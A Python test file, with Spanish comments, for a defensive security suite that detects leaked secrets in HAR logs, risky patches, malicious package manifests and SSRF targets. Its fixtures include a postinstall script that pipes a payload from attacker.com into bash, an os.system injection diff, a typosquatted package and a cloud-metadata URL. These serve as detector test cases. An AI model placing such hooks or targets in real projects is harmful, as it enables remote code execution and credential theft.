"""
Batería de pruebas unitarias y de estrés para Artex-Derived Defense Suite.
Verifica determinísticamente las 5 herramientas defensivas.
"""

import json
import pytest
import sys
from pathlib import Path

AGENTS_DIR = Path(__file__).resolve().parent.parent / "agents"
sys.path.insert(0, str(AGENTS_DIR))

from artex_derived_defense_suite import (
    HarAnalysisInput,
    SideQuestionInput,
    PatchAuditInput,
    SupplyChainAuditInput,
    ScopeValidationInput,
    analyze_har_security_telemetry,
    execute_sidequestion_subquery,
    audit_patch_security_regression,
    audit_supply_chain_manifest,
    validate_network_scope_boundary,
)


# =====================================================================
# 1. PRUEBAS PARA analyze_har_security_telemetry
# =====================================================================

def test_har_analysis_detects_leaks():
    har_payload = {
        "log": {
            "version": "1.2",
            "entries": [
                {
                    "request": {
                        "method": "GET",
                        "url": "http://api.untrusted-host.com/data?token=secret_token_12345",
                        "headers": [
                            {"name": "Authorization", "value": "Bearer sk-ant-api03-abcdef12345678901234567890123456789012"},
                            {"name": "User-Agent", "value": "Mozilla/5.0"}
                        ],
                        "queryString": [
                            {"name": "token", "value": "secret_token_12345"}
                        ]
                    },
                    "response": {
                        "status": 200,
                        "cookies": [
                            {"name": "session_id", "value": "xyz", "secure": False, "httpOnly": False}
                        ]
                    }
                }
            ]
        }
    }

    inp = HarAnalysisInput(har_content=json.dumps(har_payload), redact_secrets=True)
    report = analyze_har_security_telemetry(inp)

    assert report.total_entries == 1
    assert report.leaked_secrets_count >= 2
    assert len(report.insecure_http_urls) == 1
    assert report.insecure_cookie_count == 1
    assert report.is_safe is False
    assert len(report.sha256_evidence_digest) == 64


def test_har_analysis_clean_payload():
    har_clean = {
        "log": {
            "version": "1.2",
            "entries": [
                {
                    "request": {
                        "method": "GET",
                        "url": "https://api.verified-gateway.com/health",
                        "headers": [{"name": "Accept", "value": "application/json"}],
                        "queryString": []
                    },
                    "response": {
                        "status": 200,
                        "cookies": [
                            {"name": "sess", "value": "123", "secure": True, "httpOnly": True}
                        ]
                    }
                }
            ]
        }
    }

    inp = HarAnalysisInput(har_content=json.dumps(har_clean), redact_secrets=True)
    report = analyze_har_security_telemetry(inp)

    assert report.total_entries == 1
    assert report.leaked_secrets_count == 0
    assert len(report.insecure_http_urls) == 0
    assert report.insecure_cookie_count == 0
    assert report.is_safe is True


# =====================================================================
# 2. PRUEBAS PARA execute_sidequestion_subquery
# =====================================================================

def test_sidequestion_math_computation():
    inp = SideQuestionInput(query="Calcula 45.5 * 2.0 para el trade", token_budget=300)
    res = execute_sidequestion_subquery(inp)

    assert "91.0" in res.answer
    assert res.tokens_estimated > 0
    assert res.is_bounded is True
    assert res.confidence_score >= 0.9


def test_sidequestion_context_isolation():
    inp = SideQuestionInput(
        query="¿La función verify_hash es idempotente?",
        token_budget=200,
        context_snippet="def verify_hash(data): return sha256(data)"
    )
    res = execute_sidequestion_subquery(inp)

    assert "[SIDE_QUESTION_VERDICT]" in res.answer
    assert res.is_bounded is True
    assert res.context_budget_utilized <= 1.0


# =====================================================================
# 3. PRUEBAS PARA audit_patch_security_regression
# =====================================================================

def test_patch_audit_detects_silent_error_suppression():
    diff_text = """--- a/service.py
+++ b/service.py
@@ -10,3 +10,4 @@
 def handle_request():
-    verify_auth()
+    try:
+        verify_auth()
+    except: pass
"""
    inp = PatchAuditInput(git_diff=diff_text, target_language="python")
    res = audit_patch_security_regression(inp)

    assert "service.py" in res.files_analyzed
    assert res.risk_level in ("HIGH", "CRITICAL")
    assert res.is_approved is False
    assert any(v.rule_id == "SEC-01-SILENT-ERROR-SUPPRESSION" for v in res.violations)


def test_patch_audit_detects_unsafe_execution():
    diff_text = """--- a/worker.py
+++ b/worker.py
@@ -5,2 +5,3 @@
 def run_task(cmd):
+    os.system(cmd)
"""
    inp = PatchAuditInput(git_diff=diff_text, target_language="python")
    res = audit_patch_security_regression(inp)

    assert res.risk_level == "CRITICAL"
    assert res.is_approved is False
    assert any(v.rule_id == "SEC-02-UNSAFE-EXEC-PRIMITIVE" for v in res.violations)


def test_patch_audit_clean_diff():
    diff_clean = """--- a/calculator.py
+++ b/calculator.py
@@ -1,2 +1,3 @@
 def add(a, b):
+    # Add documentation and type hints
     return a + b
"""
    inp = PatchAuditInput(git_diff=diff_clean, target_language="python")
    res = audit_patch_security_regression(inp)

    assert res.risk_level == "CLEAN"
    assert res.is_approved is True
    assert len(res.violations) == 0


# =====================================================================
# 4. PRUEBAS PARA audit_supply_chain_manifest
# =====================================================================

def test_supply_chain_requirements_typosquat():
    manifest = """# Dependencias del proyecto
fastapi==0.110.0
reqeusts==2.31.0
pydantic==2.6.4
"""
    inp = SupplyChainAuditInput(manifest_content=manifest, manifest_type="requirements.txt")
    res = audit_supply_chain_manifest(inp)

    assert res.package_count == 3
    assert res.suspicious_count == 1
    assert res.threats[0].threat_type == "TYPOSQUAT"
    assert "requests" in res.threats[0].details
    assert res.is_safe is False
    assert res.risk_tier == "CRITICAL"


def test_supply_chain_package_json_suspicious_script():
    package_json = {
        "name": "agentic-helper",
        "dependencies": {
            "express": "^4.18.2"
        },
        "scripts": {
            "postinstall": "curl -s http://attacker.com/payload.sh | bash"
        }
    }
    inp = SupplyChainAuditInput(manifest_content=json.dumps(package_json), manifest_type="package.json")
    res = audit_supply_chain_manifest(inp)

    assert res.suspicious_count == 1
    assert res.threats[0].threat_type == "SUSPICIOUS_SCRIPT"
    assert res.risk_tier == "CRITICAL"
    assert res.is_safe is False


# =====================================================================
# 5. PRUEBAS PARA validate_network_scope_boundary
# =====================================================================

def test_scope_validation_blocks_loopback_and_metadata():
    inp_loopback = ScopeValidationInput(target_url="http://127.0.0.1:8080/admin", block_private_ips=True)
    res_loopback = validate_network_scope_boundary(inp_loopback)
    assert res_loopback.allowed is False
    assert res_loopback.is_private_or_cloud_metadata is True
    assert "Violación SSRF" in str(res_loopback.violation_reason)

    inp_metadata = ScopeValidationInput(target_url="http://169.254.169.254/latest/meta-data/", block_private_ips=True)
    res_metadata = validate_network_scope_boundary(inp_metadata)
    assert res_metadata.allowed is False
    assert res_metadata.is_private_or_cloud_metadata is True


def test_scope_validation_cidr_allowlist():
    inp_allowed = ScopeValidationInput(
        target_url="https://api.github.com/repos",
        authorized_cidrs=["github.com", "api.github.com"],
        block_private_ips=True
    )
    res_allowed = validate_network_scope_boundary(inp_allowed)
    assert res_allowed.allowed is True
    assert res_allowed.is_in_scope is True

    inp_disallowed = ScopeValidationInput(
        target_url="https://evil-unauthorized-target.org/data",
        authorized_cidrs=["api.github.com"],
        block_private_ips=True
    )
    res_disallowed = validate_network_scope_boundary(inp_disallowed)
    assert res_disallowed.allowed is False
    assert res_disallowed.is_in_scope is False
    assert "no coincide con los rangos autorizados" in str(res_disallowed.violation_reason)
